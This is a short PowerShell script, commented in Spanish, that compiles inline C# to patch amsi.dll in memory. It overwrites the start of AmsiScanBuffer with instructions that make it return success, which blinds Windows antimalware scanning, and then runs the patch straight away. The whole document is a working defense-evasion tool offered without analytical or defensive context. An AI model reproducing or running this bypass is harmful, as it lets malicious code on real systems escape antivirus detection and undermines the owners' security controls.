function Patch-Amsi {
    $amsiPatch = @"
using System;
using System.Runtime.InteropServices;

public class AmsiPatcher
{
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    public static bool PatchAmsi()
    {
        IntPtr h = GetModuleHandle("amsi.dll");
        if (h == IntPtr.Zero) return false;
        IntPtr a = GetProcAddress(h, "AmsiScanBuffer");
        if (a == IntPtr.Zero) return false;
        UInt32 oldProtect;
        if (!VirtualProtect(a, (UIntPtr)5, 0x40, out oldProtect)) return false;
        byte[] patch = { 0x31, 0xC0, 0xC3 }; // XOR EAX, EAX; RET
        Marshal.Copy(patch, 0, a, patch.Length);
        return VirtualProtect(a, (UIntPtr)5, oldProtect, out oldProtect);
    }
}
"@
    Add-Type -TypeDefinition $amsiPatch -Language CSharp
    [AmsiPatcher]::PatchAmsi()
}

# Ejecutar el bypass de AMSI
Patch-Amsi
